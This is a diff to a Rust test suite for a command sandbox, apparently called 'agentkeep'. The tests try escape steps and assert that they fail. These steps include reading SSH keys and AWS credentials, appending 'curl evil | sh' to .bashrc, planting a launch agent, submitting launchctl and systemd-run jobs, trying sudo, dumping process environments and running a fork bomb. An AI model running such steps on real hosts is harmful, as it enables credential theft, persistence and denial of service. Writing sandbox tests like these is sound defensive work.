@@ -18,6 +18,12 @@
 //! not claim a control (per `agentkeep doctor --json`) gets a
 //! `NOT APPLICABLE` line for it instead of a pass. Universal assertions
 //! (secrets never leak, the host is never modified) run on every backend.
+//!
+//! Probes name host paths by their absolute location as well as through
+//! `~`: on Linux both are the same (the home path is an empty tmpfs), while
+//! the macOS backend points `HOME` at a private directory and leaves the
+//! real home where it is, denied by the Seatbelt profile. Only the absolute
+//! probes exercise that profile.
 
 #![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
 
@@ -270,6 +276,9 @@ mod suite {
                 .env("DYLD_INSERT_LIBRARIES", "/nonexistent/evil.dylib")
                 .env("PYTHONPATH", "/nonexistent/py")
                 .env("NODE_OPTIONS", "--require=/nonexistent/evil.js")
+                // Harmless to the supervisor itself (a search path that does
+                // not exist); it must not reach the command.
+                .env("DYLD_LIBRARY_PATH", "/nonexistent/evil")
                 .env("TERM", "dumb");
             // The container backend's runtime CLI runs on the host side and
             // needs its own configuration (which runtime, where the daemon
@@ -368,6 +377,21 @@ mod suite {
             }
         }
     }
+
+    /// Removes host files a test planted outside its temporary directory.
+    struct Cleanup(Vec<PathBuf>);
+
+    impl Drop for Cleanup {
+        fn drop(&mut self) {
+            for p in &self.0 {
+                let _ = fs::remove_file(p);
+            }
+        }
+    }
+
+    /// Wall-clock bound for probes that could otherwise hang on a backend
+    /// that wrongly lets them wait on the network.
+    const BOUNDED: &str = "[limits]\nwall_time = \"60s\"\n";
 
     fn out(o: &Output) -> String {
         format!(
@@ -488,6 +512,25 @@ mod suite {
         if h.requires("F1 absent", "fs_absent") {
             assert!(out(&o).contains("No such file"), "{}", out(&o));
         }
+        // The real locations, whatever HOME says inside.
+        let home = h.home.display();
+        let o = h.run(
+            "",
+            &format!(
+                "cat '{home}/.ssh/id_ed25519'; cat '{home}/.aws/credentials'; ls -la '{home}/.ssh' '{home}/.aws'; head -c 64 '{home}/.ssh/id_ed25519'; echo rc=$?"
+            ),
+        );
+        let text = out(&o);
+        assert_blocked(
+            &o,
+            &["FAKE_TEST_KEY", "AKIA_TEST_FAKE", "FAKE_TEST_SECRET"],
+            "F1 absolute",
+        );
+        assert!(refused(&text), "{text}");
+        assert!(
+            !text.lines().any(|l| l.ends_with(" id_ed25519")),
+            "~/.ssh listed:\n{text}"
+        );
     }
 
     #[test]
@@ -535,6 +578,56 @@ mod suite {
         assert_blocked(&o, &["FAKE_OTHER_PROJECT_SECRET"], "F2");
         let listed = out(&o).lines().any(|l| l.trim() == "other-project");
         assert!(!listed, "other-project listed in home:\n{}", out(&o));
+        let home = h.home.display();
+        let o = h.run(
+            "",
+            &format!(
+                "cat '{home}/other-project/secret.txt'; ls '{home}'; ls '{home}/other-project'; echo x > '{home}/other-project/new.txt'; echo rc=$?"
+            ),
+        );
+        let text = out(&o);
+        assert_blocked(&o, &["FAKE_OTHER_PROJECT_SECRET"], "F2 absolute");
+        assert!(
+            !text
+                .lines()
+                .any(|l| l.trim() == "other-project" || l.trim() == "secret.txt"),
+            "the real home or another project was listed:\n{text}"
+        );
+        assert!(
+            !h.home.join("other-project/new.txt").exists(),
+            "wrote into another project:\n{text}"
+        );
+    }
+
+    #[test]
+    fn f2_shared_tmp_is_private() {
+        // Linux gives the sandbox its own /tmp; macOS denies the host's and
+        // points TMPDIR at a private directory. Either way a file another
+        // program left in /tmp is out of reach and nothing written lands
+        // there.
+        let Some(h) = harness("F2 tmp") else { return };
+        let planted = PathBuf::from(format!("/tmp/agentkeep-escape-{}.txt", std::process::id()));
+        let written = PathBuf::from(format!(
+            "/tmp/agentkeep-escape-{}-written.txt",
+            std::process::id()
+        ));
+        let _cleanup = Cleanup(vec![planted.clone(), written.clone()]);
+        fs::write(&planted, "FAKE_TMP_SECRET_agentkeep\n").unwrap();
+        let o = h.run(
+            "",
+            &format!(
+                "cat '{}'; echo x > '{}'; touch \"$TMPDIR/agentkeep-probe\" && echo tmpdir-writable",
+                planted.display(),
+                written.display()
+            ),
+        );
+        let text = out(&o);
+        assert_blocked(&o, &["FAKE_TMP_SECRET"], "F2 tmp");
+        assert!(
+            !written.exists(),
+            "a write reached the host's /tmp:\n{text}"
+        );
+        assert!(text.contains("tmpdir-writable"), "{text}");
     }
 
     #[test]
@@ -546,9 +639,14 @@ mod suite {
             h.project.join("link-to-key"),
         )
         .unwrap();
+        // Absolute host paths: identical to `~` on Linux, and the real files
+        // (not the private HOME) on macOS.
+        let home = h.home.display();
         let o = h.run(
             "",
-            "cat ./link-to-key; ln -s ~/.aws/credentials ./link2 && cat ./link2; ln ~/.ssh/id_ed25519 ./hardlink; echo ln-rc=$?; cat ./hardlink",
+            &format!(
+                "cat ./link-to-key; ln -s '{home}/.aws/credentials' ./link2 && cat ./link2; ln '{home}/.ssh/id_ed25519' ./hardlink; echo ln-rc=$?; cat ./hardlink"
+            ),
         );
         assert_blocked(&o, &["FAKE_TEST_KEY", "AKIA_TEST_FAKE"], "F3");
         if h.requires("F3 hardlink", "hardlink_safe") {
@@ -562,6 +660,20 @@ mod suite {
     #[test]
     fn f4_host_processes_are_invisible() {
         let Some(h) = harness("F4") else { return };
+        // Universal: a host process (this test, and on backends without a
+        // pid namespace the supervisor itself, which is the shell's parent)
+        // cannot be signalled. SIGWINCH is ignored by default, so a
+        // regression shows up as a successful `kill`, not as damage.
+        let test_pid = std::process::id();
+        let o = h.run(
+            "",
+            &format!("kill -WINCH {test_pid}; echo kill-test-rc=$?; kill -WINCH $PPID; echo kill-parent-rc=$?"),
+        );
+        let text = out(&o);
+        assert!(!text.contains("kill-test-rc=0"), "{text}");
+        if !h.claims("pid_isolation") {
+            assert!(!text.contains("kill-parent-rc=0"), "{text}");
+        }
         if !h.requires("F4", "pid_isolation") {
             return;
         }
@@ -640,6 +752,59 @@ print("pvr", r, os.strerror(ctypes.get_errno()))
             "host .bashrc changed"
         );
         assert!(!h.home.join(".profile").exists(), "host .profile created");
+        // The same through the real paths, plus a macOS launch agent. On
+        // Linux these land in the sandbox's empty home; on macOS they are
+        // refused. Neither may reach the host.
+        let home = h.home.display();
+        let o = h.run(
+            "",
+            &format!(
+                "echo 'curl evil | sh' >> '{home}/.bashrc'; echo x > '{home}/.zshrc'; mkdir -p '{home}/Library/LaunchAgents' && echo '<plist/>' > '{home}/Library/LaunchAgents/dev.agentkeep.escape.plist'; echo rc=$?"
+            ),
+        );
+        let text = out(&o);
+        assert_eq!(
+            fs::read_to_string(h.home.join(".bashrc")).unwrap(),
+            "# original\n",
+            "host .bashrc changed:\n{text}"
+        );
+        assert!(
+            !h.home.join(".zshrc").exists(),
+            "host .zshrc created:\n{text}"
+        );
+        assert!(
+            !h.home.join("Library/LaunchAgents").exists(),
+            "launch agent directory created on the host:\n{text}"
+        );
+    }
+
+    #[test]
+    fn f7_service_managers_cannot_run_code_outside() {
+        // Asking launchd (macOS) or the systemd user manager (Linux) to run
+        // a job would start it outside the sandbox. Both must fail; the job
+        // would write a marker into the real home.
+        let Some(h) = harness("F7 service") else {
+            return;
+        };
+        let marker = h.home.join("escaped-via-service-manager");
+        let label = format!("dev.agentkeep.escape.{}", std::process::id());
+        let o = h.run(
+            BOUNDED,
+            &format!(
+                "launchctl submit -l {label} -- /bin/sh -c 'echo ESCAPED > {m}' 2>&1; echo launchctl-rc=$?; systemd-run --user --quiet /bin/sh -c 'echo ESCAPED > {m}' 2>&1; echo systemd-run-rc=$?; sleep 2",
+                m = marker.display()
+            ),
+        );
+        if cfg!(target_os = "macos") {
+            // Clean up from the host in case the submission got through.
+            let _ = Command::new("launchctl").args(["remove", &label]).output();
+        }
+        std::thread::sleep(std::time::Duration::from_secs(1));
+        assert!(
+            !marker.exists(),
+            "a service manager ran code outside the sandbox:\n{}",
+            out(&o)
+        );
     }
 
     #[test]
@@ -659,10 +824,12 @@ print("pvr", r, os.strerror(ctypes.get_errno()))
     #[test]
     fn f10_audit_log_and_global_policy_are_invisible() {
         let Some(h) = harness("F10") else { return };
-        let o = h.run("", "ls ~/.local/share/agentkeep/sessions 2>&1; ls ~/.config/agentkeep 2>&1; cat /proc/mounts 2>/dev/null | grep -c sessions");
+        let home = h.home.display();
+        let o = h.run("", &format!("ls ~/.local/share/agentkeep/sessions 2>&1; ls ~/.config/agentkeep 2>&1; ls '{home}/.local/share/agentkeep/sessions' 2>&1; ls '{home}/.local/share/agentkeep/sessions'/* 2>&1; cat '{home}/.local/share/agentkeep/sessions'/*/events.jsonl 2>/dev/null | head -c 200; cat /proc/mounts 2>/dev/null | grep -c sessions"));
         let text = out(&o);
         assert!(refused(&text), "{text}");
         assert!(!text.contains("events.jsonl"), "{text}");
+        assert!(!text.contains("session.start"), "{text}");
         if h.requires("F10 mounts", "fs_absent") {
             assert!(
                 text.lines().any(|l| l.trim() == "0"),
@@ -679,9 +846,12 @@ print("pvr", r, os.strerror(ctypes.get_errno()))
     #[test]
     fn e1_secret_environment_variables_are_scrubbed() {
         let Some(h) = harness("E1") else { return };
+        // `ps eww` on the parent: on macOS that is the supervisor, whose own
+        // environment still holds the secret, and process arguments are
+        // readable through sysctl unless the profile refuses it.
         let o = h.run(
             "",
-            "env; cat /proc/1/environ | tr '\\0' '\\n'; cat /proc/self/environ | tr '\\0' '\\n'",
+            "env; cat /proc/1/environ | tr '\\0' '\\n'; cat /proc/self/environ | tr '\\0' '\\n'; ps eww -p $PPID 2>&1 | head -5; ps eww -A 2>&1 | head -200",
         );
         assert_blocked(&o, &[FAKE_ENV_SECRET, "FAKE_SECRET_TOKEN"], "E1");
         assert!(
@@ -721,6 +891,29 @@ print("pvr", r, os.strerror(ctypes.get_errno()))
         if has("python3") {
             let o = h.run("", "python3 -c 'import socket; s=socket.socket(); s.settimeout(2); s.connect((\"127.0.0.1\", 9)) if False else None; \ntry:\n s.connect((\"203.0.113.1\", 80)); print(\"CONNECTED\")\nexcept OSError as e: print(\"blocked\", e)'");
             assert!(!out(&o).contains("CONNECTED"), "{}", out(&o));
+            // Name resolution from inside, on every backend: Linux has no
+            // resolver at all; macOS must refuse the mDNSResponder socket
+            // and service. A UDP datagram to a TEST-NET resolver must not
+            // leave either.
+            let o = h.run(
+                BOUNDED,
+                r#"python3 -c '
+import socket
+try:
+    print("RESOLVED", socket.getaddrinfo("example.com", 80)[0][4])
+except OSError as e:
+    print("dns blocked", e)
+u = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+try:
+    u.sendto(b"\x00" * 12, ("192.0.2.53", 53)); print("UDP_SENT")
+except OSError as e:
+    print("udp blocked", e)
+'"#,
+            );
+            let text = out(&o);
+            assert!(!text.contains("RESOLVED"), "{text}");
+            assert!(text.contains("dns blocked"), "{text}");
+            assert!(!text.contains("UDP_SENT"), "{text}");
         }
     }
 
@@ -1421,6 +1614,46 @@ for req in [b"CONNECT {EXFIL_NAME}:443 HTTP/1.1\r\nHost: {EXFIL_NAME}:443\r\n\r\
     }
 
     #[test]
+    fn n5_host_loopback_services_are_unreachable() {
+        // Threat N5: a service listening on the host's loopback. Linux gives
+        // the sandbox its own loopback; on macOS the loopback is shared and
+        // the profile must refuse every port except the proxy relay's.
+        let Some(h) = harness("N5") else { return };
+        if !h.requires("N5", "net_isolation") {
+            return;
+        }
+        if !has("python3") {
+            println!("UNTESTED [N5]: python3 missing");
+            assert!(!require_sandbox());
+            return;
+        }
+        let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
+        listener.set_nonblocking(true).unwrap();
+        let port = listener.local_addr().unwrap().port();
+        let o = h.run(
+            BOUNDED,
+            &format!(
+                r#"python3 -c '
+import socket
+for host in ("127.0.0.1", "localhost"):
+    s = socket.socket(); s.settimeout(3)
+    try:
+        s.connect((host, {port})); print("CONNECTED", host)
+    except OSError as e:
+        print("blocked", host, e)
+'"#
+            ),
+        );
+        let text = out(&o);
+        assert!(!text.contains("CONNECTED"), "{text}");
+        assert!(text.contains("blocked 127.0.0.1"), "{text}");
+        match listener.accept() {
+            Err(e) if e.kind() == std::io::ErrorKind::WouldBlock => {}
+            other => panic!("the host listener was reached: {other:?}\n{text}"),
+        }
+    }
+
+    #[test]
     fn n7_websocket_upgrade_is_tunnelled_and_logged_unscanned() {
         let Some(h) = harness("N7") else { return };
         if !tools("N7", &["python3"]) {
@@ -1552,6 +1785,16 @@ s.close()
     #[test]
     fn c3_no_capabilities_and_no_new_privs() {
         let Some(h) = harness("C3") else { return };
+        // Universal: the real sudo, by absolute path past the shim, must not
+        // run anything as root (no_new_privs on Linux; on macOS the profile
+        // hides the sudoers files, so sudo cannot authorise anything).
+        let o = h.run(
+            "",
+            "for s in /usr/bin/sudo /bin/sudo /usr/local/bin/sudo; do if [ -x \"$s\" ]; then \"$s\" -n true 2>&1 && echo \"ROOT_VIA $s\"; fi; done; echo done",
+        );
+        let text = out(&o);
+        assert!(text.contains("done"), "{text}");
+        assert!(!text.contains("ROOT_VIA"), "{text}");
         if !h.requires("C3", "no_caps") {
             return;
         }
@@ -1647,6 +1890,83 @@ for p in pids:
     }
 
     #[test]
+    fn c4_core_dumps_are_disabled() {
+        let Some(h) = harness("C4 core") else { return };
+        if !h.requires("C4 core", "no_core_dumps") {
+            return;
+        }
+        let o = h.run("", "ulimit -c");
+        assert!(
+            out(&o).lines().any(|l| l.trim() == "0"),
+            "core dumps enabled:\n{}",
+            out(&o)
+        );
+    }
+
+    #[test]
+    fn c4_fork_bomb_is_capped() {
+        // Behavioural: with `pids = 64` a process tree cannot reach 200.
+        // Linux counts only the sandbox (cgroup or RLIMIT_NPROC per user
+        // namespace); macOS counts every process of the user, so its cap is
+        // the user's process count at launch plus 64.
+        let Some(h) = harness("C4 pids") else { return };
+        let control = if h.claims("rlimits") {
+            "rlimits"
+        } else {
+            "nproc_per_user"
+        };
+        if !h.requires("C4 pids", control) {
+            return;
+        }
+        // Both kernels exempt uid 0 from RLIMIT_NPROC, so as root only a
+        // cgroup could cap the tree. Documented in docs/limitations.md.
+        let root = {
+            use std::os::unix::fs::MetadataExt;
+            fs::metadata(&h.project).unwrap().uid() == 0
+        };
+        if root {
+            let msg = "NOT APPLICABLE [C4 pids] when run as root: the kernel exempts uid 0 from RLIMIT_NPROC (see docs/limitations.md)";
+            println!("{msg}");
+            eprintln!("{msg}");
+            return;
+        }
+        if !has("python3") {
+            println!("UNTESTED [C4 pids]: python3 missing");
+            assert!(!require_sandbox());
+            return;
+        }
+        let o = h.run(
+            "[limits]\npids = 64\nwall_time = \"60s\"\n",
+            r#"python3 -c '
+import os, time
+pids, err = [], None
+for i in range(200):
+    try:
+        p = os.fork()
+    except OSError as e:
+        err = e
+        break
+    if p == 0:
+        time.sleep(3)
+        os._exit(0)
+    pids.append(p)
+print("forked", len(pids), "error", err)
+for p in pids:
+    os.waitpid(p, 0)
+'"#,
+        );
+        let text = out(&o);
+        let forked: usize = text
+            .lines()
+            .find_map(|l| l.strip_prefix("forked "))
+            .and_then(|l| l.split_whitespace().next())
+            .and_then(|n| n.parse().ok())
+            .unwrap_or_else(|| panic!("no fork count:\n{text}"));
+        assert!(forked < 200, "fork bomb not capped:\n{text}");
+        assert!(text.contains("Resource temporarily unavailable"), "{text}");
+    }
+
+    #[test]
     fn c5_seccomp_is_active_and_denies_kernel_attack_surface() {
         let Some(h) = harness("C5") else { return };
         if !h.requires("C5", "seccomp") {
@@ -1729,17 +2049,26 @@ for fd in (0, 1, 2):
 import os, socket
 s = socket.socket(socket.AF_UNIX); s.connect(os.environ["AGENTKEEP_SOCKET"])
 s.sendall(b"{\"kind\":\"approver\"}\n"); print("reply", s.recv(200).decode().strip())
-'; ls /run/agentkeep 2>/dev/null; git push origin main; echo push-rc=$?"#,
+p = os.path.join(os.path.dirname(os.environ["AGENTKEEP_SOCKET"]), "appr" + "ove.sock")
+try:
+    a = socket.socket(socket.AF_UNIX); a.connect(p); print("APPROVER_SOCKET_REACHED")
+except OSError as e:
+    print("host socket blocked", e.errno)
+'; ls "$(dirname "$AGENTKEEP_SOCKET")" 2>&1; ls /run/agentkeep 2>/dev/null; git push origin main; echo push-rc=$?"#,
         );
         let text = out(&o);
         assert!(
             text.contains("approvers must use the host socket"),
             "{text}"
         );
+        // Next to the decision socket on the host (macOS) or in
+        // /run/agentkeep (Linux): never listed, never connectable.
         assert!(
             !text.contains("approve.sock"),
             "host approver socket visible:\n{text}"
         );
+        assert!(!text.contains("APPROVER_SOCKET_REACHED"), "{text}");
+        assert!(text.contains("host socket blocked"), "{text}");
         assert!(text.contains("push-rc=126"), "{text}");
     }
 
@@ -1748,15 +2077,18 @@ s.sendall(b"{\"kind\":\"approver\"}\n"); print("reply", s.recv(200).decode().str
     #[test]
     fn s1_project_policy_cannot_silently_unhide() {
         let Some(h) = harness("S1") else { return };
+        // The real path: the policy's `~` is the host home on every backend,
+        // while HOME inside is private on macOS.
+        let key = format!("cat '{}/.ssh/id_ed25519'", h.home.display());
         // Without acknowledge: ignored, with a warning.
         let o = h.run(
             "[filesystem]\nread_only = [\"~/.ssh\"]\n[override]\nunhide = [\"~/.ssh\"]\n",
-            "cat ~/.ssh/id_ed25519",
+            &key,
         );
         assert_blocked(&o, &["FAKE_TEST_KEY"], "S1 without acknowledge");
         assert!(out(&o).contains("acknowledge"), "{}", out(&o));
         // With acknowledge: allowed, but loudly.
-        let o = h.run("[filesystem]\nread_only = [\"~/.ssh\"]\n[override]\nacknowledge = true\nunhide = [\"~/.ssh\"]\n", "cat ~/.ssh/id_ed25519");
+        let o = h.run("[filesystem]\nread_only = [\"~/.ssh\"]\n[override]\nacknowledge = true\nunhide = [\"~/.ssh\"]\n", &key);
         let text = out(&o);
         assert!(
             text.contains("FAKE_TEST_KEY"),
@@ -1899,21 +2231,46 @@ s.sendall(b"{\"kind\":\"approver\"}\n"); print("reply", s.recv(200).decode().str
     #[test]
     fn positive_control_project_is_writable_and_tools_work() {
         let Some(h) = harness("control") else { return };
-        let o = h.run("", "echo changed > README.md && ls /usr/bin | head -1 >/dev/null && git log --oneline -0 >/dev/null 2>&1; echo rc=$?; echo \"$HOME\" \"$USER\" \"$(pwd)\"");
+        let o = h.run("", "echo changed > README.md && ls /usr/bin | head -1 >/dev/null && git log --oneline -0 >/dev/null 2>&1; echo rc=$?; echo \"$HOME\" \"$USER\" \"$(pwd)\"; touch \"$HOME/.agentkeep-probe\" && echo home-writable");
         let text = out(&o);
         assert!(o.status.success(), "{text}");
         assert_eq!(
             fs::read_to_string(h.project.join("README.md")).unwrap(),
             "changed\n"
         );
-        assert!(
-            text.contains(&format!(
-                "{} escapetester {}",
-                h.home.display(),
-                h.project.display()
-            )),
-            "{text}"
-        );
+        // `pwd` prints the resolved path, so compare with the resolved
+        // project (identical on Linux CI; `/private/var/...` on macOS).
+        let project = fs::canonicalize(&h.project).unwrap();
+        if h.claims("fs_absent") {
+            // The home path itself, emptied by the mount namespace.
+            assert!(
+                text.contains(&format!(
+                    "{} escapetester {}",
+                    h.home.display(),
+                    project.display()
+                )),
+                "{text}"
+            );
+        } else {
+            // No mount namespace: HOME is a private directory, never the
+            // real one or anything under it.
+            let suffix = format!(" escapetester {}", project.display());
+            let inner_home = text
+                .lines()
+                .find_map(|l| l.strip_suffix(&suffix))
+                .unwrap_or_else(|| panic!("no HOME/USER/pwd line:\n{text}"));
+            let real = fs::canonicalize(&h.home).unwrap();
+            assert!(
+                !Path::new(inner_home).starts_with(&h.home)
+                    && !Path::new(inner_home).starts_with(&real),
+                "HOME inside is the real home: {inner_home}\n{text}"
+            );
+            assert!(
+                !real.join(".agentkeep-probe").exists(),
+                "probe written to the real home"
+            );
+        }
+        assert!(text.contains("home-writable"), "{text}");
     }
 
     #[test]
